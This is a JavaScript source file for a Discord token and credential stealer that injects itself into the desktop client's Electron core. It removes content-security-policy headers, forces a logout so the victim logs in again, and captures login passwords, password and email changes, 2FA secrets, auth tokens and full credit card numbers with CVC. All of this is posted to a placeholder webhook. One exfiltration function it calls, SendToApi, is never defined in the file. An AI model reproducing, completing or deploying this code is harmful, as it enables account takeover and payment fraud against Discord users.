const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron')
const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
var webhook = "%WEBHOOK_LINK%";

function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "Paradise"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "Paradise"));
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
    return !1
}

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
	if (details.url.startsWith(webhook)) {
		if (details.url.includes("discord.com")) {
			callback({
				responseHeaders: Object.assign({
					'Access-Control-Allow-Headers': "*"
				}, details.responseHeaders)
			});
		} else {
			callback({
				responseHeaders: Object.assign({
					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
					'Access-Control-Allow-Headers': "*",
					"Access-Control-Allow-Origin": "*"
				}, details.responseHeaders)
			});
		}


	} else {
		delete details.responseHeaders['content-security-policy'];
		delete details.responseHeaders['content-security-policy-report-only'];

		callback({
			responseHeaders: {
				...details.responseHeaders,
				'Access-Control-Allow-Headers': "*"
			}
		})
	}

})

const Filter = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
	if (FirstTime()) {}

	callback({})
	return;
})

function SendToWebhook(info) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
        xhr.open("POST", "${webhook}", true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
        xhr.send(JSON.stringify(${info}));
    `, !0)
}

function GetNitro(type) {
	if (type == 0) {
		return "No Nitro"
	}
	if (type == 1) {
		return "<:Rogue_nitro:934007729780047922>"
	}
	if (type == 2) {
		return "<:Rogue_nitro:934007729780047922><a:420_booster_op:924523310828646430>"
	} else {
		return "No Nitro"
	}
}

function GetBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const House_Bravery = 64;
	const House_Brilliance = 128;
	const House_Balance = 256;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "<:staff_blue:951786138471919626> "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "<:partner:951785714234851368> "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "<:HypesquadEvents_FX:929722784039436318> "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "<:BugHunter:951786313332449350> "
	}
	if ((flags & House_Bravery) == House_Bravery) {
		badges += "<:bravery:951785279734308894> "
	}
	if ((flags & House_Brilliance) == House_Brilliance) {
		badges += "<:hypered:951785499977216051>  "
	}
	if ((flags & House_Balance) == House_Balance) {
		badges += "<:hypesquadbalance:951786439857815552> "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "<a:early:951784170298957825> "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "<:goldDiscordBugHunter:951786368210706432> "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "<:dev:951784131140939796>  "
	}
	if (badges == "") {
		badges = "<a:carpi:951786547387191386>"
	}
	return badges
}

function ChangeEmail(pEmail, pPassword, pToken) {
    const win = BrowserWindow[`getAllWindows`]()[0];
    win["webContents"][`executeJavaScript`](`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
        xmlHttp.setRequestHeader("Authorization", "` + pToken + `");
        xmlHttp.send( null );
        xmlHttp.responseText;`, true)[`then`](res => {
        var resJson = JSON[`parse`](res),
            data = {
                username: resJson[`username`] + "#" + resJson[`discriminator`],
                id: resJson.id,
                avatar: resJson[`avatar`],
                nitro: resJson["premium_type"],
                badges: resJson[`flags`],
                email: pEmail,
                password: pPassword,
                token: pToken,
                type: "changedemail"
            };

        SendToApi(JSON[`stringify`](data));
    });
}

function ChangePassword(pPassword, pNewPassword, pToken) {
    const win = BrowserWindow[`getAllWindows`]()[0];
    win["webContents"][`executeJavaScript`](`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization",` + ' "' + pToken + `");
    xmlHttp.send( null );
    xmlHttp.responseText;`, true)[`then`](res => {
        var resJson = JSON[`parse`](res),
            data = {
                username: resJson[`username`] + "#" + resJson[`discriminator`],
                avatar: resJson[`avatar`],
                id: resJson.id,
                nitro: resJson["premium_type"],
                badges: resJson[`flags`],
                email: resJson[`email`],
                new_password: pNewPassword,
                password: pPassword,
                token: pToken,
                type: `changedpassword`
            };
        SendToApi(JSON[`stringify`](data));
    });
}

function CreditCardAdded(pCCNum, pCvc, pExpireMonth, pExpireYear, pToken) {
    const win = BrowserWindow[`getAllWindows`]()[0];
    win["webContents"][`executeJavaScript`](`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization",` + ' "' + pToken + `");
    xmlHttp.send( null );
    xmlHttp.responseText;`, true)[`then`](res => {
        var resJson = JSON[`parse`](res),
            data = {
                username: resJson[`username`] + "#" + resJson[`discriminator`],
                id: resJson.id,
                avatar: resJson[`avatar`],
                nitro: resJson["premium_type"],
                badges: resJson[`flags`],
                email: resJson[`email`],
                cc_num: pCCNum,
                expire_year: pExpireYear,
                expire_month: pExpireMonth,
                token: pToken,
                cvc: pCvc,
                type: `creditcard`
            };
        SendToApi(JSON[`stringify`](data));
    });
}

function Enable2fa(pSecret, pPassword, pToken) {
    const win = BrowserWindow[`getAllWindows`]()[0];
    win["webContents"][`executeJavaScript`](`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization",` + ' "' + pToken + `");
    xmlHttp.send( null );
    xmlHttp.responseText;`, true)[`then`](res => {
        var resJson = JSON[`parse`](res),
            data = {
                username: resJson[`username`] + "#" + resJson[`discriminator`],
                avatar: resJson[`avatar`],
                id: resJson.id,
                nitro: resJson["premium_type"],
                badges: resJson[`flags`],
                email: resJson[`email`],
                secret: pSecret,
                password: pPassword,
                token: pToken,
                type: `enable2fa`
            };
        SendToApi(JSON[`stringify`](data));
    });
}

function Login(pEmail, pPassword, pToken) {
    const win = BrowserWindow[`getAllWindows`]()[0];
    win[`webContent` + "s"][`executeJavaScript`](`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization",` + ' "' + pToken + `");
    xmlHttp.send( null );
    xmlHttp.responseText;`, true)[`then`](res => {
        var resJson = JSON[`parse`](res),
            data = {
                username: resJson[`username`] + "#" + resJson[`discriminator`],
                id: resJson.id,
                avatar: resJson[`avatar`],
                nitro: resJson["premium_type"],
                badges: resJson[`flags`],
                email: pEmail,
                password: pPassword,
                token: pToken,
                type: `login`
            };
        SendToApi(JSON[`stringify`](data));
    });
}

const UrlFilter = {
	urls: ["https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => {
	if (details.url.endsWith("login")) {
		if (details.statusCode == 200) {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			const email = data.login;
			const password = data.password;
			const window = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(TokenEval, !0).then((token => {
				Login(email, password, token)
			}))
		}
	}
	if (details.url.endsWith("users/@me")) {
		if (details.statusCode == 200 && details.method == "PATCH") {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			if (data.password != null && data.password != undefined && data.password != "") {
				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
						ChangePassword(data.password, data.new_password, token)
					}))
				}
				if (data.email != null && data.email != undefined && data.email != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(TokenEval, !0).then((token => {
						ChangeEmail(data.email, data.password, token)
					}))
				}
			}
		}
	}
	if (details.url.endsWith("tokens")) {
		const item = querystring.parse(details.uploadData[0].bytes.toString())
        const window = BrowserWindow.getAllWindows()[0];
        window.webContents.executeJavaScript(TokenEval, !0).then((token => {
            CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
        }))
	}
});
module.exports = require('./core.asar')
